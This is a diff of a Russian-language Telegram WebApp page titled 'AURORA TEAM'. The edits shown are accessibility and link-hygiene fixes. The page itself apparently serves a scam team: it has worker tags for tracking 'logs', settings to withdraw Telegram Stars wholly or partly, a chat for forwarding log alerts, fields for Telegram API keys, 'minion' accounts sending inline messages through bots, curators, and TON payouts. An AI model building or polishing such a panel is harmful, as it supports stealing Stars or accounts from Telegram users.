@@ -2,7 +2,7 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
   <title>AURORA TEAM</title>
   
   <!-- Telegram WebApp SDK -->
@@ -237,11 +237,11 @@
             Добавь Telegram ID человека — он сможет отправлять инлайн-сообщения через твоих ботов. Свой ID добавлять не нужно.
           </p>
           <p class="section-hint">
-            Узнать ID можно в боте <a href="https://t.me/getmy_idbot" target="_blank" class="accent-link" id="linkGetIdBot">@getmy_idbot</a>
+            Узнать ID можно в боте <a href="https://t.me/getmy_idbot" target="_blank" rel="noopener noreferrer" class="accent-link" id="linkGetIdBot">@getmy_idbot</a>
           </p>
 
           <div class="form-block">
-            <label class="form-label">TELEGRAM ID</label>
+            <label class="form-label" for="inputMinionId">TELEGRAM ID</label>
             <input type="text" class="form-input" id="inputMinionId" placeholder="123456789" inputmode="numeric">
             <button class="btn-primary mt-3" id="btnAddMinion">Добавить</button>
           </div>
@@ -277,12 +277,12 @@
 
           <div class="stars-form-card">
             <div class="form-group">
-              <label class="form-label">ССЫЛКА НА ПОСТ</label>
+              <label class="form-label" for="inputStarsPost">ССЫЛКА НА ПОСТ</label>
               <input type="text" class="form-input" id="inputStarsPost" value="https://t.me/slarzio/2">
             </div>
 
             <div class="form-group mt-4">
-              <label class="form-label">СНИМАТЬ ЗВЁЗДЫ</label>
+              <span class="form-label">СНИМАТЬ ЗВЁЗДЫ</span>
               <div class="segmented-control" id="segWithdrawStars">
                 <button type="button" class="seg-btn" data-value="false">Не снимать</button>
                 <button type="button" class="seg-btn active" data-value="true">Снимать</button>
@@ -290,7 +290,7 @@
             </div>
 
             <div class="form-group mt-4">
-              <label class="form-label">КАК СНИМАТЬ</label>
+              <span class="form-label">КАК СНИМАТЬ</span>
               <div class="segmented-control" id="segHowWithdraw">
                 <button type="button" class="seg-btn" data-value="balance">С остатком</button>
                 <button type="button" class="seg-btn active" data-value="all">Снимать все</button>
@@ -339,7 +339,7 @@
                 </div>
               </div>
               <div class="menu-item-right">
-                <label class="ios-switch">
+                <label class="ios-switch" for="switchExtraLog">
                   <input type="checkbox" id="switchExtraLog" checked>
                   <span class="slider"></span>
                 </label>
@@ -573,7 +573,7 @@
           </div>
 
           <!-- Active Sessions Panel -->
-          <div class="active-sessions-panel" id="activeSessionsPanel" style="display: none;">
+          <div class="active-sessions-panel hidden" id="activeSessionsPanel">
             <div class="sessions-header-row">
               <span class="active-tag-count">Активные боты: <strong id="activeBotsCount">3</strong></span>
               <button class="btn-refresh-sessions" id="btnRefreshSessions" title="Обновить">↻</button>
@@ -752,7 +752,7 @@
       <h3 class="modal-title">TON-кошелек</h3>
       <p class="modal-desc">Укажите ваш адрес TON для выплат вознаграждений</p>
       <div class="modal-body">
-        <label class="form-label">АДРЕС КОШЕЛЬКА</label>
+        <label class="form-label" for="inputTonAddress">АДРЕС КОШЕЛЬКА</label>
         <input type="text" class="form-input" id="inputTonAddress" placeholder="EQ... или UQ..." spellcheck="false">
       </div>
       <div class="modal-footer">
@@ -778,7 +778,7 @@
             <span id="withdrawWalletTarget">Не указан</span>
           </div>
         </div>
-        <label class="form-label mt-3">СУММА (TON)</label>
+        <label class="form-label mt-3" for="inputWithdrawAmount">СУММА (TON)</label>
         <input type="number" class="form-input" id="inputWithdrawAmount" placeholder="Минимум 1 TON" min="1" step="0.1">
       </div>
       <div class="modal-footer">
@@ -795,7 +795,7 @@
       <h3 class="modal-title">Смена тэга воркера</h3>
       <p class="modal-desc">Тэг используется для отслеживания логов в системе</p>
       <div class="modal-body">
-        <label class="form-label">НОВЫЙ ТЭГ</label>
+        <label class="form-label" for="inputNewTag">НОВЫЙ ТЭГ</label>
         <input type="text" class="form-input" id="inputNewTag" placeholder="#teg">
       </div>
       <div class="modal-footer">
@@ -818,7 +818,7 @@
             <div class="mentor-name">@aurora_lead</div>
             <div class="mentor-role">Главный куратор • 24/7</div>
           </div>
-          <a href="https://t.me/aurora_lead" target="_blank" class="btn-contact-mentor">Написать</a>
+          <a href="https://t.me/aurora_lead" target="_blank" rel="noopener noreferrer" class="btn-contact-mentor">Написать</a>
         </div>
         <div class="mentor-item">
           <div class="mentor-avatar">⚡</div>
@@ -826,7 +826,7 @@
             <div class="mentor-name">@support_slarz</div>
             <div class="mentor-role">Технический саппорт</div>
           </div>
-          <a href="https://t.me/support_slarz" target="_blank" class="btn-contact-mentor">Написать</a>
+          <a href="https://t.me/support_slarz" target="_blank" rel="noopener noreferrer" class="btn-contact-mentor">Написать</a>
         </div>
       </div>
       <div class="modal-footer">
@@ -842,9 +842,9 @@
       <h3 class="modal-title">Telegram API Keys</h3>
       <p class="modal-desc">Ключи Telegram API с сайта my.telegram.org</p>
       <div class="modal-body">
-        <label class="form-label">API_ID</label>
+        <label class="form-label" for="inputApiId">API_ID</label>
         <input type="text" class="form-input" id="inputApiId" placeholder="20485921">
-        <label class="form-label mt-3">API_HASH</label>
+        <label class="form-label mt-3" for="inputApiHash">API_HASH</label>
         <input type="text" class="form-input" id="inputApiHash" placeholder="c89283f982b09a471b6928e1...">
       </div>
       <div class="modal-footer">
@@ -861,9 +861,9 @@
       <h3 class="modal-title">Управление отстуком</h3>
       <p class="modal-desc">Настройка чата для пересылки уведомлений о логах</p>
       <div class="modal-body">
-        <label class="form-label">ID ЧАТА / КАНАЛА</label>
+        <label class="form-label" for="inputChatId">ID ЧАТА / КАНАЛА</label>
         <input type="text" class="form-input" id="inputChatId" placeholder="-100192847192">
-        <label class="form-label mt-3">ID ТЕМЫ / FORUM TOPIC (ОПЦИОНАЛЬНО)</label>
+        <label class="form-label mt-3" for="inputThreadId">ID ТЕМЫ / FORUM TOPIC (ОПЦИОНАЛЬНО)</label>
         <input type="text" class="form-input" id="inputThreadId" placeholder="7">
         <button class="btn-secondary full-width mt-3" id="btnTestLog">🚀 Отправить тестовый лог</button>
       </div>
